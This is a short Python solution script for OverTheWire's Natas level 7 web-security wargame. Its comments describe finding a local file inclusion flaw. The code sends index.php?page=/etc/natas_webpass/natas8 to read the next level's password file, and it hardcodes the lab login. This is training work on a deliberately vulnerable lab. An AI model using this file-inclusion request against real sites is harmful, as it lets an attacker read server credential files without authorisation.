#!/usr/bin/env python

import requests
import re

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'
"""———————————————————————————————————————"""
url = 'http://%s.natas.labs.overthewire.org' % username
print(url) #make sure the URL works fine

"""Starting with our default stuff"""
#response = requests.get(url, auth = (username, password))
#content = response.text
#print(content) 
"""Well, right of the bat we see <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
But, after running a quick test, it doesn't look like that page exists..
I pulled both of the index.php pages and they didn't really have anything, so I searched for 'how to hide files on my webpage' and found this:
https://stackoverflow.com/questions/19439348/what-is-the-best-way-to-hide-a-websites-folder-directory-files
So index.php can hide files... more searching...
Alright, I admit, I had to cheat to find the trick for this one since I couldn't find the proper name for it...
https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
That page has the concept - basically, we need to use the index.php to gain access since that file is what is hiding us from the resource we want.
Since this page isn't properly sanitizing input, we were able to just use that file to get around thing
"""

response = requests.get(url + "/index.php?page=/etc/natas_webpass/natas8", auth = (username, password))
content = response.text
print(content) 

#classic regexing
print(re.findall('<br>\n(.*)\n\n', content))


"""SDG"""